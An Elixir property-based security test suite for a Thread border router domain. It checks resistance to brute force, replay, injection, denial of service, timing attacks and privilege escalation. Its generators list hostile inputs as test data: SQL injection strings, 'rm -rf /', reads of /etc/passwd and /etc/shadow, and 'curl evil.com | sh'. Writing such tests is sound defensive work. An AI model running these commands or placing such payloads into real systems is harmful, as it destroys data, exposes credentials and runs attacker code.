defmodule NTBR.Domain.Test.SecurityChaosPropertiesTest do
  @moduledoc false
  # Security-focused chaos testing with adversarial scenarios.
  #   
  #   Tests the system under security attacks, malicious inputs,
  #   and adversarial conditions. Goes beyond happy path testing
  #   to ensure security properties hold under attack.
  #   
  #   Based on STRIDE threat model:
  #   - Spoofing
  #   - Tampering
  #   - Repudiation
  #   - Information Disclosure
  #   - Denial of Service
  #   - Elevation of Privilege
  use ExUnit.Case, async: false
  use PropCheck

  alias NTBR.Domain.Resources.{Network, Device, Joiner, BorderRouter}
  alias NTBR.Domain.Spinel.{Frame, Client}

  @moduletag :property
  @moduletag :integration
  @moduletag :security
  @moduletag :security_chaos
  @moduletag :adversarial

  # ===========================================================================
  # Authentication Attacks
  # ===========================================================================

  property "system resists brute force PSKD attacks",
           [:verbose, {:numtests, 200}] do
    forall {network_id, attack_attempts} <- brute_force_attack_gen() do
      {:ok, network} = Network.create(%{
        name: "BruteForce-#{network_id}",
        network_name: "BruteForceNet"
      })
      
      # Legitimate joiner with correct PSKD
      correct_pskd = "CORRECT123"
      device_eui64 = :crypto.strong_rand_bytes(8)
      
      {:ok, legitimate_joiner} = Joiner.create(%{
        network_id: network.id,
        eui64: device_eui64,
        pskd: correct_pskd,
        timeout: 120
      })
      
      # Attacker tries many wrong PSKDs
      attack_results = Enum.map(attack_attempts, fn wrong_pskd ->
        result = try do
          Joiner.create(%{
            network_id: network.id,
            eui64: device_eui64,  # Same device trying to join
            pskd: wrong_pskd,
            timeout: 120
          })
        rescue
          _ -> {:error, :system_error}
        end
        
        # Should fail for wrong PSKD
        match?({:error, _}, result)
      end)
      
      # All attacks should fail
      all_attacks_failed = Enum.all?(attack_results)
      
      # Legitimate joiner should still work
      {:ok, _started} = Joiner.start(legitimate_joiner)
      
      result = all_attacks_failed
      attack_count = length(attack_attempts)
      
      aggregate(:attack_count, attack_count,
        classify(attack_count > 50, "high intensity attack", result))
    end
  end

  property "concurrent authentication attempts don't bypass security",
           [:verbose, {:numtests, 100}] do
    forall {network_id, concurrent_attackers} <- concurrent_auth_attack_gen() do
      {:ok, network} = Network.create(%{
        name: "ConcAuth-#{network_id}",
        network_name: "ConcAuthNet"
      })
      
      # Spawn many concurrent authentication attempts with invalid credentials
      tasks = Enum.map(concurrent_attackers, fn {eui64, invalid_pskd} ->
        Task.async(fn ->
          result = Joiner.create(%{
            network_id: network.id,
            eui64: eui64,
            pskd: invalid_pskd,
            timeout: 120
          })
          
          # Try to start even if creation might have issues
          case result do
            {:ok, joiner} -> Joiner.start(joiner)
            error -> error
          end
        end)
      end)
      
      results = Enum.map(tasks, fn task ->
        try do
          Task.await(task, 5000)
        catch
          :exit, _ -> {:error, :timeout}
        end
      end)
      
      # All invalid attempts should fail
      all_failed = Enum.all?(results, fn
        {:error, _} -> true
        {:ok, joiner} -> joiner.state != :joining  # Shouldn't reach joining state
        _ -> false
      end)
      
      # System should still be operational
      {:ok, _test_network} = Network.read(network.id)
      
      result = all_failed
      attacker_count = length(concurrent_attackers)
      
      measure("Concurrent attackers", attacker_count, result)
    end
  end

  property "replay attacks are detected and rejected",
           [:verbose, {:numtests, 100}] do
    forall replay_scenario <- replay_attack_gen() do
      {:ok, network} = Network.create(%{
        name: "Replay-#{:rand.uniform(10000)}",
        network_name: "ReplayNet"
      })
      
      # Legitimate session
      {:ok, joiner} = Joiner.create(%{
        network_id: network.id,
        eui64: :crypto.strong_rand_bytes(8),
        pskd: "LEGITIMATE",
        timeout: 120
      })
      
      {:ok, joiner} = Joiner.start(joiner)
      
      # Attacker captures and replays the session
      replay_attempts = Enum.map(1..replay_scenario.replay_count, fn _ ->
        # Try to create duplicate joiner (replay)
        try do
          Joiner.create(%{
            network_id: network.id,
            eui64: joiner.eui64,  # Same EUI64 (replay)
            pskd: "REPLAYED",
            timeout: 120
          })
        rescue
          _ -> {:error, :replay_detected}
        end
      end)
      
      # Replays should be detected
      replays_rejected = Enum.all?(replay_attempts, fn
        {:error, _} -> true
        {:ok, duplicate} -> duplicate.id != joiner.id  # Different session
      end)
      
      replays_rejected
    end
  end

  # ===========================================================================
  # Injection Attacks
  # ===========================================================================

  property "SQL injection patterns in names are sanitized",
           [:verbose, {:numtests, 300}] do
    forall malicious_name <- sql_injection_gen() do
      result = try do
        Network.create(%{
          name: malicious_name,
          network_name: "SafeNet"
        })
      rescue
        _ -> {:error, :injection_prevented}
      catch
        _ -> {:error, :injection_prevented}
      end
      
      # Should either reject or safely handle
      case result do
        {:ok, network} ->
          # If accepted, verify it didn't cause SQL injection
          # Use list action instead of read!() which requires an ID
          {:ok, networks} = Network.list()
          is_list(networks)  # Database still works

        {:error, _} ->
          # Rejected is also fine
          true
      end
    end
    |> aggregate(:injection_type, fn name ->
      cond do
        String.contains?(name, "'") -> :single_quote
        String.contains?(name, "\"") -> :double_quote
        String.contains?(name, "--") -> :comment
        String.contains?(name, "DROP") -> :drop_table
        String.contains?(name, "UNION") -> :union_select
        true -> :other
      end
    end)
  end

  property "command injection patterns are neutralized",
           [:verbose, {:numtests, 200}] do
    forall command_injection <- command_injection_gen() do
      result = try do
        Network.create(%{
          name: command_injection,
          network_name: "CommandNet"
        })
      rescue
        _ -> {:error, :injection_prevented}
      end
      
      # System should not execute commands
      case result do
        {:ok, network} ->
          # Verify name is stored safely
          retrieved = Network.read!(network.id)
          is_binary(retrieved.name)
        
        {:error, _} ->
          true
      end
    end
  end

  property "frame injection attacks don't corrupt protocol state",
           [:verbose, {:numtests, 300}] do
    forall malicious_frames <- frame_injection_gen() do
      # Inject malicious frames into protocol
      results = Enum.map(malicious_frames, fn frame_data ->
        try do
          Frame.decode(frame_data)
        rescue
          _ -> {:error, :injection_rejected}
        catch
          _ -> {:error, :injection_rejected}
        end
      end)
      
      # Verify protocol state not corrupted
      test_frame = Frame.new(:reset, <<>>, tid: 0)
      encoded = Frame.encode(test_frame)
      {:ok, _decoded} = Frame.decode(encoded)
      
      # All malicious frames should be rejected or safely handled
      Enum.all?(results, fn
        {:ok, _} -> true  # Decoded but didn't corrupt
        {:error, _} -> true  # Rejected
      end)
    end
  end

  # ===========================================================================
  # Denial of Service Attacks
  # ===========================================================================

  property "excessive joiner creation doesn't exhaust resources",
           [:verbose, {:numtests, 50}] do
    forall attack_intensity <- integer(100, 1000) do
      {:ok, network} = Network.create(%{
        name: "DoS-#{:rand.uniform(10000)}",
        network_name: "DoSNet"
      })
      
      memory_before = :erlang.memory(:total)
      
      # Attacker floods with joiner requests
      flood_results = Enum.map(1..attack_intensity, fn i ->
        try do
          Joiner.create(%{
            network_id: network.id,
            eui64: <<0::48, i::16>>,
            pskd: "FLOOD#{i}",
            timeout: 1  # Short timeout
          })
        rescue
          _ -> {:error, :rate_limited}
        end
      end)
      
      memory_after = :erlang.memory(:total)
      memory_growth_mb = (memory_after - memory_before) / 1024 / 1024
      
      # System should handle gracefully
      system_stable = memory_growth_mb < 100  # Less than 100MB growth
      
      # Some requests may succeed, but system shouldn't crash
      at_least_some_handled = Enum.any?(flood_results, fn
        {:ok, _} -> true
        {:error, _} -> true
        _ -> false
      end)
      
      result = system_stable and at_least_some_handled
      
      measure("Attack intensity", attack_intensity,
        classify(attack_intensity > 500, "extreme DoS", result))
    end
  end

  property "rapid state changes don't cause race conditions",
           [:verbose, {:numtests, 100}] do
    forall rapid_transitions <- rapid_state_change_gen() do
      {:ok, network} = Network.create(%{
        name: "Race-#{:rand.uniform(10000)}",
        network_name: "RaceNet"
      })
      
      # Attacker rapidly triggers state changes
      tasks = Enum.map(rapid_transitions, fn transition ->
        Task.async(fn ->
          try do
            case transition do
              :attach -> 
                net = Network.read!(network.id)
                Network.attach(net)
              
              :detach ->
                net = Network.read!(network.id)
                Network.detach(net)
              
              :promote ->
                net = Network.read!(network.id)
                Network.promote(net)
            end
          rescue
            _ -> {:error, :transition_failed}
          end
        end)
      end)
      
      results = Enum.map(tasks, &Task.await(&1, 5000))
      
      # System should maintain consistency
      final_network = Network.read!(network.id)
      valid_final_state = final_network.state in [:detached, :child, :router, :leader]
      
      # No crashes
      no_crashes = Enum.all?(results, fn
        {:ok, _} -> true
        {:error, _} -> true
        _ -> false
      end)
      
      valid_final_state and no_crashes
    end
  end

  property "resource exhaustion attacks are mitigated",
           [:verbose, {:numtests, 50}] do
    forall resource_attack <- resource_exhaustion_gen() do
      case resource_attack.target do
        :memory ->
          memory_before = :erlang.memory(:total)
          
          # Attacker tries to allocate excessive resources
          results = Enum.map(1..resource_attack.intensity, fn i ->
            try do
              Network.create(%{
                name: "Exhaust-#{i}",
                network_name: String.duplicate("X", 16)  # Max allowed
              })
            rescue
              _ -> {:error, :resource_limited}
            end
          end)
          
          memory_after = :erlang.memory(:total)
          memory_growth_mb = (memory_after - memory_before) / 1024 / 1024
          
          # Growth should be bounded
          memory_growth_mb < 200
        
        :cpu ->
          start_time = :erlang.monotonic_time(:millisecond)
          
          # Attacker triggers expensive operations
          Enum.each(1..resource_attack.intensity, fn i ->
            try do
              {:ok, network} = Network.create(%{
                name: "CPU-#{i}",
                network_name: "CPUNet"
              })
              Network.operational_dataset(network)
            rescue
              _ -> :ok
            end
          end)
          
          elapsed = :erlang.monotonic_time(:millisecond) - start_time
          
          # Should complete in reasonable time
          elapsed < resource_attack.intensity * 50  # < 50ms per operation
      end
    end
  end

  # ===========================================================================
  # Cryptographic Attacks
  # ===========================================================================

  property "timing attacks don't leak credential information",
           [:verbose, {:numtests, 100}] do
    forall {correct_pskd, attack_pskds} <- timing_attack_gen() do
      {:ok, network} = Network.create(%{
        name: "Timing-#{:rand.uniform(10000)}",
        network_name: "TimingNet"
      })
      
      # Measure timing for correct PSKD
      {time_correct, _} = :timer.tc(fn ->
        Joiner.create(%{
          network_id: network.id,
          eui64: :crypto.strong_rand_bytes(8),
          pskd: correct_pskd,
          timeout: 120
        })
      end)
      
      # Measure timing for incorrect PSKDs
      times_incorrect = Enum.map(attack_pskds, fn wrong_pskd ->
        {time, _} = :timer.tc(fn ->
          Joiner.create(%{
            network_id: network.id,
            eui64: :crypto.strong_rand_bytes(8),
            pskd: wrong_pskd,
            timeout: 120
          })
        end)
        time
      end)
      
      # Timing should be constant (within 10% variance)
      avg_incorrect = Enum.sum(times_incorrect) / length(times_incorrect)
      variance = abs(time_correct - avg_incorrect) / avg_incorrect
      
      # Small variance indicates timing attack resistance
      variance < 0.1
    end
  end

  property "weak credentials are rejected",
           [:verbose, {:numtests, 200}] do
    forall weak_credential <- weak_credential_gen() do
      {:ok, network} = Network.create(%{
        name: "Weak-#{:rand.uniform(10000)}",
        network_name: "WeakNet"
      })
      
      result = Joiner.create(%{
        network_id: network.id,
        eui64: :crypto.strong_rand_bytes(8),
        pskd: weak_credential,
        timeout: 120
      })
      
      # Weak credentials should be rejected
      match?({:error, _}, result)
    end
    |> aggregate(:weakness_type, fn cred ->
      cond do
        String.length(cred) < 6 -> :too_short
        String.match?(cred, ~r/^(.)\1+$/) -> :repeated_char
        String.downcase(cred) in ["password", "123456", "qwerty"] -> :common_password
        true -> :other_weak
      end
    end)
  end

  property "key material is never exposed in logs or errors",
           [:verbose, {:numtests, 100}] do
    forall _scenario <- integer(1, 100) do
      {:ok, network} = Network.create(%{
        name: "KeyExposure-#{:rand.uniform(10000)}",
        network_name: "KeyExposureNet"
      })
      
      # Generate various outputs that might leak keys
      outputs = [
        inspect(network),
        inspect(network, pretty: true),
        "#{network}",
        Network.operational_dataset(network) |> inspect()
      ]
      
      # Network key should NOT appear in any output
      key_not_exposed = Enum.all?(outputs, fn output ->
        not String.contains?(output, Base.encode16(network.network_key))
      end)
      
      # Extended PAN ID should NOT appear in full
      xpanid_not_exposed = Enum.all?(outputs, fn output ->
        not String.contains?(output, Base.encode16(network.extended_pan_id))
      end)
      
      key_not_exposed and xpanid_not_exposed
    end
  end

  # ===========================================================================
  # Privilege Escalation
  # ===========================================================================

  property "end devices cannot elevate to router without authorization",
           [:verbose, {:numtests, 100}] do
    forall _scenario <- integer(1, 100) do
      {:ok, network} = Network.create(%{
        name: "Elevation-#{:rand.uniform(10000)}",
        network_name: "ElevationNet"
      })
      
      # Create end device
      {:ok, end_device} = Device.create(%{
        network_id: network.id,
        extended_address: :crypto.strong_rand_bytes(8),
        rloc16: :rand.uniform(0xFFFF),
        device_type: :end_device,
        link_quality: 3,
        rssi: -50
      })
      
      # Attacker tries to elevate privileges
      result = try do
        Device.update(end_device, %{device_type: :router})
      rescue
        _ -> {:error, :elevation_prevented}
      end
      
      # Elevation should be prevented or properly validated
      case result do
        {:ok, updated} ->
          # If allowed, should require proper authorization flow
          # For now, check it didn't just blindly accept
          updated.device_type == :end_device or
          # If it changed, verify network state allows it
          Network.read!(network.id).state == :leader
        
        {:error, _} ->
          true
      end
    end
  end

  property "unauthorized devices cannot join without proper PSKD",
           [:verbose, {:numtests, 200}] do
    forall unauthorized_attempt <- unauthorized_join_gen() do
      {:ok, network} = Network.create(%{
        name: "Unauth-#{:rand.uniform(10000)}",
        network_name: "UnauthNet"
      })
      
      # No joiner created (no authorization)
      # Attacker tries to directly create device
      result = try do
        Device.create(%{
          network_id: network.id,
          extended_address: unauthorized_attempt.eui64,
          rloc16: unauthorized_attempt.rloc16,
          device_type: :end_device,
          link_quality: 3,
          rssi: -50
        })
      rescue
        _ -> {:error, :unauthorized}
      end
      
      # Without proper commissioning, should verify authorization
      # Device creation might succeed, but joining should require PSKD
      case result do
        {:ok, device} ->
          # Device created without commissioning
          # Verify no joiner exists for this device (no PSKD authorization)
          joiners = Joiner.by_network!(network.id)
          matching_joiner = Enum.find(joiners, fn j ->
            j.eui64 == unauthorized_attempt.eui64
          end)

          # No matching joiner should exist (device not properly authorized)
          is_nil(matching_joiner)

        {:error, _} ->
          # Device creation rejected - preferred behavior for unauthorized attempts
          true
      end
    end
  end

  # ===========================================================================
  # Malformed Data Attacks
  # ===========================================================================

  property "malformed frames with correct checksums don't bypass validation",
           [:verbose, {:numtests, 500}] do
    forall malformed_but_valid_frame <- malformed_frame_gen() do
      result = try do
        Frame.decode(malformed_but_valid_frame)
      rescue
        error -> {:error, {:decode_error, error}}
      catch
        :exit, reason -> {:error, {:exit, reason}}
      end
      
      case result do
        {:ok, frame} ->
          # If decoded, must be actually valid
          frame.tid >= 0 and frame.tid <= 15
        
        {:error, _} ->
          # Rejection is expected for malformed
          true
      end
    end
    |> aggregate(:frame_attack_type, fn frame ->
      case byte_size(frame) do
        0 -> :empty
        1 -> :truncated
        n when n > 100 -> :oversized
        _ -> :crafted
      end
    end)
  end

  property "unicode and encoding attacks are sanitized",
           [:verbose, {:numtests, 300}] do
    forall malicious_unicode <- unicode_attack_gen() do
      result = try do
        Network.create(%{
          name: malicious_unicode,
          network_name: "UnicodeNet"
        })
      rescue
        _ -> {:error, :unicode_attack_prevented}
      end
      
      case result do
        {:ok, network} ->
          # If accepted, should be safely stored
          retrieved = Network.read!(network.id)
          String.valid?(retrieved.name)
        
        {:error, _} ->
          true
      end
    end
    |> aggregate(:unicode_attack_type, fn str ->
      cond do
        String.contains?(str, "\u0000") -> :null_byte
        String.contains?(str, "\u202E") -> :rtl_override
        String.length(str) != String.length(String.graphemes(str)) -> :zero_width
        String.normalize(str, :nfc) != String.normalize(str, :nfd) -> :normalization
        true -> :other_unicode
      end
    end)
  end

  # ===========================================================================
  # Generators
  # ===========================================================================

  defp brute_force_attack_gen do
    let {network_id, attempt_count} <- {integer(1, 10000), integer(10, 100)} do
      attempts = Enum.map(1..attempt_count, fn _i ->
        # Generate wrong PSKDs
        chars = ~c"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%"
        length = Enum.random(6..32)
        for _ <- 1..length, into: "", do: <<Enum.random(chars)>>
      end)
      
      {network_id, attempts}
    end
  end

  defp concurrent_auth_attack_gen do
    let {network_id, attacker_count} <- {integer(1, 10000), integer(10, 100)} do
      attackers = Enum.map(1..attacker_count, fn i ->
        eui64 = <<0::48, i::16>>
        invalid_pskd = "WRONG#{i}"
        {eui64, invalid_pskd}
      end)
      
      {network_id, attackers}
    end
  end

  defp replay_attack_gen do
    let [
      replay_count <- integer(5, 20),
      delay_between <- integer(0, 100)
    ] do
      %{
        replay_count: replay_count,
        delay_between: delay_between
      }
    end
  end

  defp sql_injection_gen do
    oneof([
      "'; DROP TABLE networks; --",
      "' OR '1'='1",
      "admin'--",
      "' UNION SELECT * FROM networks--",
      "1'; DROP TABLE devices; --",
      "test' AND 1=1; --",
      String.duplicate("'", 100),
      "test\"; DROP TABLE networks; --"
    ])
  end

  defp command_injection_gen do
    oneof([
      "; rm -rf /",
      "| cat /etc/passwd",
      "`whoami`",
      "$(cat /etc/shadow)",
      "; curl evil.com | sh",
      "& ping -c 100 localhost"
    ])
  end

  defp frame_injection_gen do
    let count <- integer(10, 50) do
      Enum.map(1..count, fn _ ->
        oneof([
          :crypto.strong_rand_bytes(Enum.random(0..200)),  # Random data
          <<0xFF, 0xFF, 0xFF, 0xFF>>,  # All ones
          <<0x00, 0x00, 0x00, 0x00>>,  # All zeros
          <<0x80, Enum.random(0..255)>>  # Crafted header
        ])
      end)
    end
  end

  defp rapid_state_change_gen do
    let count <- integer(20, 100) do
      Enum.map(1..count, fn _ ->
        oneof([:attach, :detach, :promote])
      end)
    end
  end

  defp resource_exhaustion_gen do
    let [
      target <- oneof([:memory, :cpu]),
      intensity <- integer(100, 500)
    ] do
      %{
        target: target,
        intensity: intensity
      }
    end
  end

  defp timing_attack_gen do
    correct_pskd = "CORRECT123456"
    
    # Generate PSKDs with increasing similarity
    attack_pskds = [
      "WRONG123456",     # Different first char
      "CARRECT123456",   # One char different
      "CORRECT123457",   # Last char different
      "CORRECT12345",    # One char shorter
      "XORRECT123456"    # Middle char different
    ]
    
    {correct_pskd, attack_pskds}
  end

  defp weak_credential_gen do
    oneof([
      "12345",           # Too short
      "AAAAAA",          # Repeated char
      "password",        # Common password
      "123456",          # Common password
      "qwerty",          # Common password
      "111111",          # Repeated digit
      String.duplicate("A", 5)  # Just under minimum
    ])
  end

  defp unauthorized_join_gen do
    %{
      eui64: :crypto.strong_rand_bytes(8),
      rloc16: :rand.uniform(0xFFFF)
    }
  end

  defp malformed_frame_gen do
    oneof([
      <<>>,                                    # Empty
      <<0x80>>,                               # No command
      <<0x80, 0xFF, 0xFF, 0xFF>>,           # Invalid command
      <<0x00, 0x02>>,                         # Wrong header (no bit 7)
      :crypto.strong_rand_bytes(200),         # Oversized
      <<0x80, 0x02>> <> :crypto.strong_rand_bytes(150)  # Valid header, garbage
    ])
  end

  defp unicode_attack_gen do
    oneof([
      "test\u0000hidden",              # Null byte injection
      "test\u202Emalicious",           # Right-to-left override
      "test\u200Bzero\u200Bwidth",     # Zero-width spaces
      "Ãºnïcödë\u0301",                # Combining characters
      String.duplicate("😀", 50),      # Emoji flood
      "test\r\ninjected",              # CRLF injection
      "test\u2028line\u2029separator"  # Line/paragraph separators
    ])
  end
end
